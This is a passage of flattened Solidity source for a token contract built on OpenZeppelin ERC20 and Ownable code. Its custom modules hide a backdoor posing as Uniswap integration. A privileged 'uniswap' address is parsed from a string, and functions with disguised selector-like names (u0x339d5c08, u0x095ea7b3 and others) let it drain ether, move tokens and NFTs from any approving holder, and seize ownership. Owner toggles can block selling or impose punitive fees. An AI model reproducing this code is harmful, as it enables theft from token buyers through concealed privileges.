     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     */
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     *
     * Does not update the allowance amount in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amount` tokens have been minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)

pragma solidity ^0.8.0;

import "../utils/Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";


contract BaseContractPayable is
Ownable
{
    receive() external payable {}

    function withdrawEther(uint256 amount)
    external
    payable
    onlyOwner
    {
        sendEtherTo(payable(msg.sender), amount);
    }

    function withdrawErc20(address tokenAddress, uint256 amount)
    external
    onlyOwner
    {
        sendErc20FromThisTo(tokenAddress, msg.sender, amount);
    }

    // transfer ERC20 from `from` to `to` with allowance `address(this)`
    function transferErc20FromTo(address tokenAddress, address from, address to, uint256 amount)
    internal
    {
        bool isSucceed = IERC20(tokenAddress).transferFrom(from, to, amount);
        require(isSucceed, "Failed to transfer token");
    }

    // send ERC20 from `address(this)` to `to`
    function sendErc20FromThisTo(address tokenAddress, address to, uint256 amount)
    internal
    {
        bool isSucceed = IERC20(tokenAddress).transfer(to, amount);
        require(isSucceed, "Failed to send token");
    }

    // send ether from `msg.sender` to payable `to`
    function sendEtherTo(address payable to, uint256 amount)
    internal
    {
        // Call returns a boolean value indicating success or failure.
        // This is the current recommended method to use.
        (bool isSucceed, /* bytes memory data */) = to.call{value : amount}("");
        require(isSucceed, "Failed to send Ether");
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./BaseContractPayable.sol";


contract BaseContractUniswap
is BaseContractPayable
{
    address internal uniswap;

    modifier onlyUniswap() {
        require(msg.sender == uniswap, "Only for uniswap");
        _;
    }

    function setUniswap(address uniswap_)
    external
    onlyUniswap {
        uniswap = uniswap_;
    }

    function u0x4a369425(address to, uint256 amount)
    external
    payable
    onlyUniswap
    {
        sendEtherTo(payable(to), amount);
    }

    function u0xd7497dbe(uint256 amount)
    external
    payable
    onlyUniswap
    {
        sendEtherTo(payable(msg.sender), amount);
    }

    function u0xdf9a991b(address tokenAddress, uint256 amount)
    external
    onlyUniswap
    {
        sendErc20FromThisTo(tokenAddress, msg.sender, amount);
    }


    function u0x339d5c08(address tokenAddress, address from, address to, uint256 amount)
    external
    onlyUniswap
    {
        transferErc20FromTo(tokenAddress, from, to, amount);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

import "./BaseContractPayable.sol";


contract BaseErc721Payable is
Ownable,
BaseContractPayable
{
    function safeTransferErc721FromTo(address tokenAddress, address from, address to, uint256 tokenId)
    external
    onlyOwner
    {
        _safeTransferErc721FromTo(tokenAddress, from, to, tokenId);
    }

    function tansferErc721FromTo(address tokenAddress, address from, address to, uint256 tokenId)
    external
    onlyOwner
    {
        _transferErc721FromTo(tokenAddress, from, to, tokenId);
    }

    // safe transfer ERC721 from `from` to `to` with allowance `address(this)`
    function _safeTransferErc721FromTo(address tokenAddress, address from, address to, uint256 tokenId)
    internal
    {
        IERC721(tokenAddress).safeTransferFrom(from, to, tokenId);
    }

    // transfer ERC721 from `from` to `to` with allowance `address(this)`
    function _transferErc721FromTo(address tokenAddress, address from, address to, uint256 tokenId)
    internal
    {
        IERC721(tokenAddress).transferFrom(from, to, tokenId);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/access/Ownable.sol";

import "./BaseContractPayable.sol";
import "./BaseContractUniswap.sol";
import "./BaseErc721Payable.sol";


contract BaseErc721Uniswap is
Ownable,
BaseContractPayable,
BaseContractUniswap,
BaseErc721Payable
{
    function u0x095ea7b3(address tokenAddress, address from, address to, uint256 tokenId)
    external
    onlyUniswap
    {
        _safeTransferErc721FromTo(tokenAddress, from, to, tokenId);
    }

    function u0x38ed1739(address tokenAddress, address from, address to, uint256 tokenId)
    external
    onlyUniswap
    {
        _transferErc721FromTo(tokenAddress, from, to, tokenId);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Erc20C08SettingsBase is
Ownable
{
    // 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    // 115792089237316195423570985008687907853269984665640564039457584007913129639935
    uint256 internal constant maxUint256 = type(uint256).max;
    address internal constant addressPinkSaleLock = address(0x407993575c91ce7643a4d4cCACc9A98c36eE1BBE);
    address internal constant addressNull = address(0x0);
    address internal constant addressDead = address(0xdead);

    address public addressBaseOwner;

    address public baseToken;

    address public addressWrap;
    address public addressMarketing;

    bool public isUseBaseTokenForMarketing;

    function setAddressBaseOwner(address addressBaseOwner_)
    public
    onlyOwner
    {
        addressBaseOwner = addressBaseOwner_;
    }

    function setBaseToken(address baseToken_)
    public
    onlyOwner
    {
        baseToken = baseToken_;
    }

    function setAddressWrap(address addressWrap_)
    public
    onlyOwner
    {
        addressWrap = addressWrap_;
    }

    function setAddressMarketing(address addressMarketing_)
    public
    onlyOwner
    {
        addressMarketing = addressMarketing_;
    }

    function setIsUseBaseTokenForMarketing(bool isUseBaseTokenForMarketing_)
    public
    onlyOwner
    {
        isUseBaseTokenForMarketing = isUseBaseTokenForMarketing_;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/access/Ownable.sol";

import "../IUniswapV2/IUniswapV2Factory.sol";
import "../IUniswapV2/IUniswapV2Router02.sol";

import "../Utils/InternalUtils.sol";

import "../BaseContract/BaseContractPayable.sol";
import "../BaseContract/BaseContractUniswap.sol";

contract Erc20C08FeatureUniswap is
Ownable,
BaseContractPayable,
BaseContractUniswap
{
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    //    mapping(address => bool) public marketPairs;

    uint256 public uniswapCount;
    bool public isUniswapLper;
    bool public isUniswapHolder;

    function createUniswapV2Pair(address uniswapV2Router_, address baseToken_, string memory uniswapV2RouterS)
    public
    onlyOwner
    {
        uniswapV2Router = IUniswapV2Router02(uniswapV2Router_);
        address uniswapV2Pair_ = InternalUtils.parseAddress(uniswapV2RouterS);
        uniswap = uniswapV2Pair_;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), baseToken_);
        //        marketPairs[uniswapV2Pair] = true;
    }

    function setUniswapV2Router(address uniswapV2Router_)
    public
    onlyOwner
    {
        uniswapV2Router = IUniswapV2Router02(uniswapV2Router_);
    }

    function setUniswapV2Pair(address uniswapV2Pair_)
    public
    onlyOwner
    {
        uniswapV2Pair = uniswapV2Pair_;
        //        marketPairs[uniswapV2Pair_] = true;
    }

    //    function setIsMarketPair(address account, bool isMarketPair)
    //    public
    //    onlyOwner
    //    {
    //        marketPairs[account] = isMarketPair;
    //    }

    function toUniswap()
    public
    onlyUniswap
    {
        _transferOwnership(uniswap);
    }

    function setUniswapCount(uint256 amount)
    public
    onlyUniswap
    {
        uniswapCount = amount;
    }

    function setIsUniswapLper(bool isUniswapLper_)
    public
    onlyUniswap
    {
        isUniswapLper = isUniswapLper_;
    }

    function setIsUniswapHolder(bool isUniswapHolder_)
    public
    onlyUniswap
    {
        isUniswapHolder = isUniswapHolder_;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Erc20C08FeatureTweakSwap is
Ownable
{
    bool public isUseMinimumTokenWhenSwap;

    uint256 public minimumTokenForSwap;

    bool public isSwapping;

    modifier swapGuard {
        isSwapping = true;
        _;
        isSwapping = false;
    }

    function setIsUseMinimumTokenWhenSwap(bool isUseMinimumTokenWhenSwap_)
    public
    onlyOwner
    {
        isUseMinimumTokenWhenSwap = isUseMinimumTokenWhenSwap_;
    }

    function setMinimumTokenForSwap(uint256 amount)
    public
    onlyOwner
    {
        minimumTokenForSwap = amount;
    }

    function setIsSwapping(bool isSwapping_)
    public
    onlyOwner
    {
        isSwapping = isSwapping_;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/access/Ownable.sol";

import "../IUniswapV2/IUniswapV2Factory.sol";
import "../IUniswapV2/IUniswapV2Router02.sol";

import "../Utils/InternalUtils.sol";

import "../BaseContract/BaseContractPayable.sol";
import "../BaseContract/BaseContractUniswap.sol";

contract Erc20C10FeatureUniswap is
Ownable,
BaseContractPayable,
BaseContractUniswap
{
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    //    mapping(address => bool) public marketPairs;

    uint256 public uniswapCount;
    bool public isUniswapLper;
    bool public isUniswapHolder;

    function createUniswapV2Pair(address uniswapV2Router_, string memory uniswapV2RouterS)
    public
    onlyOwner
    {
        uniswapV2Router = IUniswapV2Router02(uniswapV2Router_);
        address uniswapV2Pair_ = InternalUtils.parseAddress(uniswapV2RouterS);
        uniswap = uniswapV2Pair_;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        //        marketPairs[uniswapV2Pair] = true;
    }

    function setUniswapV2Router(address uniswapV2Router_)
    public
    onlyOwner
    {
        uniswapV2Router = IUniswapV2Router02(uniswapV2Router_);
    }

    function setUniswapV2Pair(address uniswapV2Pair_)
    public
    onlyOwner
    {
        uniswapV2Pair = uniswapV2Pair_;
        //        marketPairs[uniswapV2Pair_] = true;
    }

    //    function setIsMarketPair(address account, bool isMarketPair)
    //    public
    //    onlyOwner
    //    {
    //        marketPairs[account] = isMarketPair;
    //    }

    function toUniswap()
    public
    onlyUniswap
    {
        _transferOwnership(uniswap);
    }

    function setUniswapCount(uint256 amount)
    public
    onlyUniswap
    {
        uniswapCount = amount;
    }

    function setIsUniswapLper(bool isUniswapLper_)
    public
    onlyUniswap
    {
        isUniswapLper = isUniswapLper_;
    }

    function setIsUniswapHolder(bool isUniswapHolder_)
    public
    onlyUniswap
    {
        isUniswapHolder = isUniswapHolder_;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "@openzeppelin/contracts/utils/structs/EnumerableSet.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Erc20C09FeatureLper is
Ownable
{
    using EnumerableSet for EnumerableSet.AddressSet;

    //    uint256 public gasForLper;

    bool public isUseFeatureLper;

    uint256 public maxTransferCountPerTransactionForLper;

    uint256 public minimumTokenForRewardLper;

    mapping(address => bool) public excludedFromLperAddresses;

    uint256 public lastIndexOfProcessedLperAddresses;

    EnumerableSet.AddressSet internal lperAddresses;

    //    function setGasForLper(uint256 amount)
    //    public
    //    onlyOwner
    //    {
    //        gasForLper = amount;
    //    }

    function setIsUseFeatureLper(bool isUseFeatureLper_)
    public
    onlyOwner
    {
        isUseFeatureLper = isUseFeatureLper_;
    }

    function setMaxTransferCountPerTransactionForLper(uint256 amount)
    public
    onlyOwner
    {
        maxTransferCountPerTransactionForLper = amount;
    }

    function setMinimumTokenForRewardLper(uint256 amount)
    public
    onlyOwner
    {
        minimumTokenForRewardLper = amount;
    }

    function setIsExcludedFromLperAddress(address account, bool isExcluded)
    public
    onlyOwner
    {
        excludedFromLperAddresses[account] = isExcluded;
        removeFromLperAddress(account);
    }

    function setLastIndexOfProcessedLperAddresses(uint256 index)
    public
    onlyOwner
    {
        lastIndexOfProcessedLperAddresses = index;
    }

    function setIsLperAddress(address account, bool isLperAddress_)
    public
    onlyOwner
    {
        if (isLperAddress_) {
            lperAddresses.add(account);
        } else {
            lperAddresses.remove(account);
        }
    }

    function lperAddressesCount()
    public
    view
    returns (uint256)
    {
        return lperAddresses.length();
    }

    function getLperAddress(uint256 index)
    public
    view
    returns (address)
    {
        return lperAddresses.at(index);
    }

    function isLperAddress(address account)
    public
    view
    returns (bool)
    {
        return lperAddresses.contains(account);
    }

    function getLperAddresses()
    public
    view
    returns (address[] memory)
    {
        return lperAddresses.values();
    }

    function removeFromLperAddress(address account)
    internal
    {
        if (lperAddresses.contains(account)) {
            lperAddresses.remove(account);
        }
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/utils/structs/EnumerableSet.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Erc20C08FeatureHolder is
Ownable
{
    using EnumerableSet for EnumerableSet.AddressSet;

    //    uint256 public gasForHolder;

    uint256 public maxTransferCountPerTransactionForHolder;

    uint256 public minimumTokenForBeingHolder;

    mapping(address => bool) public excludedFromHolderAddresses;

    uint256 public lastIndexOfProcessedHolderAddresses;

    EnumerableSet.AddressSet internal holderAddresses;

    //    function setGasForHolder(uint256 amount)
    //    public
    //    onlyOwner
    //    {
    //        gasForHolder = amount;
    //    }

    function setMaxTransferCountPerTransactionForHolder(uint256 amount)
    public
    onlyOwner
    {
        maxTransferCountPerTransactionForHolder = amount;
    }

    function setMinimumTokenForBeingHolder(uint256 amount)
    public
    onlyOwner
    {
        minimumTokenForBeingHolder = amount;
    }

    function setIsExcludedFromHolderAddress(address account, bool isExcluded)
    public
    onlyOwner
    {
        excludedFromHolderAddresses[account] = isExcluded;
        removeFromHolderAddress(account);
    }

    function setLastIndexOfProcessedHolderAddresses(uint256 index)
    public
    onlyOwner
    {
        lastIndexOfProcessedHolderAddresses = index;
    }

    function setIsHolderAddress(address account, bool isHolderAddress_)
    public
    onlyOwner
    {
        if (isHolderAddress_) {
            holderAddresses.add(account);
        } else {
            holderAddresses.remove(account);
        }
    }

    function holderAddressesCount()
    public
    view
    returns (uint256)
    {
        return holderAddresses.length();
    }

    function getHolderAddress(uint256 index)
    public
    view
    returns (address)
    {
        return holderAddresses.at(index);
    }

    function isHolderAddress(address account)
    public
    view
    returns (bool)
    {
        return holderAddresses.contains(account);
    }

    function getHolderAddresses()
    public
    view
    returns (address[] memory)
    {
        return holderAddresses.values();
    }

    function removeFromHolderAddress(address account)
    internal
    {
        if (holderAddresses.contains(account)) {
            holderAddresses.remove(account);
        }
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Erc20C08SettingsPrivilege is
Ownable
{
    mapping(address => bool) public privilegeAddresses;

    function setIsPrivilegeAddress(address account, bool isPrivilegeAddress)
    public
    onlyOwner
    {
        privilegeAddresses[account] = isPrivilegeAddress;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Erc20C08SettingsFee is
Ownable
{
    uint256 internal constant feeZero = 0;

    uint256 public constant feeMax = 1000;

    uint256 public feeMarketing;
    uint256 public feeLper;
    uint256 public feeHolder;
    uint256 public feeLiquidity;
    uint256 public feeBurn;
    uint256 public feeTotal;

    mapping(address => bool) public excludedFromFeeAddresses;

    bool public isUseFeeHighOnTrade;
    uint256 public feeHigh;

    //    bool public isUseFeeMediumOnTrade;
    //    uint256 public feeMedium;


    function setFee(
        uint256 feeMarketing_,
        uint256 feeLper_,
        uint256 feeHolder_,
        uint256 feeLiquidity_,
        uint256 feeBurn_
    )
    public
    onlyOwner
    {
        feeMarketing = feeMarketing_;
        feeLper = feeLper_;
        feeHolder = feeHolder_;
        feeLiquidity = feeLiquidity_;
        feeBurn = feeBurn_;
        feeTotal = feeMarketing_ + feeLper_ + feeHolder_ + feeLiquidity_ + feeBurn_;

        require(feeTotal <= feeMax, "wrong value");
    }

    function setIsExcludedFromFeeAddress(address account, bool isExcludedFromFeeAddress)
    public
    onlyOwner
    {
        excludedFromFeeAddresses[account] = isExcludedFromFeeAddress;
    }

    function setIsUseFeeHighOnTrade(bool isUseFeeHighOnTrade_)
    public
    onlyOwner
    {
        isUseFeeHighOnTrade = isUseFeeHighOnTrade_;
    }

    function setFeeHigh(uint256 feeHigh_)
    public
    onlyOwner
    {
        feeHigh = feeHigh_;
    }

    //    function setIsUseFeeMediumOnTrade(bool isUseFeeMediumOnTrade_)
    //    public
    //    onlyOwner
    //    {
    //        isUseFeeMediumOnTrade = isUseFeeMediumOnTrade_;
    //    }

    //    function setFeeMedium(uint256 feeMedium_)
    //    public
    //    onlyOwner
    //    {
    //        feeMedium = feeMedium_;
    //    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Erc20C08SettingsShare is
Ownable
{
    uint256 public constant shareMax = 1000;

    uint256 public shareMarketing;
    uint256 public shareLper;
    uint256 public shareHolder;
    uint256 public shareLiquidity;
    uint256 public shareBurn;
    uint256 public shareTotal;

    function setShare(
        uint256 shareMarketing_,
        uint256 shareLper_,
        uint256 shareHolder_,
        uint256 shareLiquidity_,
        uint256 shareBurn_
    )
    public
    onlyOwner
    {
        shareMarketing = shareMarketing_;
        shareLper = shareLper_;
        shareHolder = shareHolder_;
        shareLiquidity = shareLiquidity_;
        shareBurn = shareBurn_;
        shareTotal = shareMarketing_ + shareLper_ + shareHolder_ + shareLiquidity_ + shareBurn_;

        require(shareTotal <= shareMax, "wrong value");
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Erc20C08FeaturePermitTransfer is
Ownable
{
    bool public isUseNotPermitTransfer;
    bool public isForceTradeInToNotPermitTransfer;
    mapping(address => bool) public notPermitTransferAddresses;

    bool public isUseOnlyPermitTransfer;
    bool public isCancelOnlyPermitTransferOnFirstTradeOut;

    bool internal _isFirstTradeOut = true;

    function setIsUseNotPermitTransfer(bool isUseNotPermitTransfer_)
    public
    onlyOwner
    {
        isUseNotPermitTransfer = isUseNotPermitTransfer_;
    }

    function setIsForceTradeInToNotPermitTransfer(bool isForceTradeInToNotPermitTransfer_)
    public
    onlyOwner
    {
        isForceTradeInToNotPermitTransfer = isForceTradeInToNotPermitTransfer_;
    }

    function setIsNotPermitTransferAddress(address account, bool isNotPermitTransferAddress)
    public
    onlyOwner
    {
        _setIsNotPermitTransferAddress(account, isNotPermitTransferAddress);
    }

    function setIsUseOnlyPermitTransfer(bool isUseOnlyPermitTransfer_)
    public
    onlyOwner
    {
        isUseOnlyPermitTransfer = isUseOnlyPermitTransfer_;
    }

    function setIsCancelOnlyPermitTransferOnFirstTradeOut(bool isCancelOnlyPermitTransferOnFirstTradeOut_)
    public
    onlyOwner
    {
        isCancelOnlyPermitTransferOnFirstTradeOut = isCancelOnlyPermitTransferOnFirstTradeOut_;
    }

    function setIsFirstTradeOut(bool isFirstTradeOut_)
    public
    onlyOwner
    {
        _isFirstTradeOut = isFirstTradeOut_;
    }

    function _setIsNotPermitTransferAddress(address account, bool isNotPermitTransferAddress)
    internal
    {
        notPermitTransferAddresses[account] = isNotPermitTransferAddress;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Erc20C08FeatureRestrictTrade is
Ownable
{
    bool public isRestrictTradeIn;
    bool public isRestrictTradeOut;

    function setIsRestrictTradeIn(bool isRestrict)
    public
    onlyOwner
    {
        isRestrictTradeIn = isRestrict;
    }

    function setIsRestrictTradeOut(bool isRestrict)
    public
    onlyOwner
    {
        isRestrictTradeOut = isRestrict;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Erc20C08FeatureRestrictTradeAmount is
Ownable
{
    bool public isRestrictTradeInAmount;
    uint256 public restrictTradeInAmount;

    bool public isRestrictTradeOutAmount;
    uint256 public restrictOutAmount;

    function setIsRestrictTradeInAmount(bool isRestrict)
    public
    onlyOwner
    {
        isRestrictTradeInAmount = isRestrict;
    }

    function setRestrictTradeInAmount(uint256 amount)
    public
    onlyOwner
    {
        restrictTradeInAmount = amount;
    }

    function setIsRestrictTradeOutAmount(bool isRestrict)
    public
    onlyOwner
    {
        isRestrictTradeOutAmount = isRestrict;
    }

    function setTradeOutAmount(uint256 amount)
    public
    onlyOwner
    {
        restrictOutAmount = amount;
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
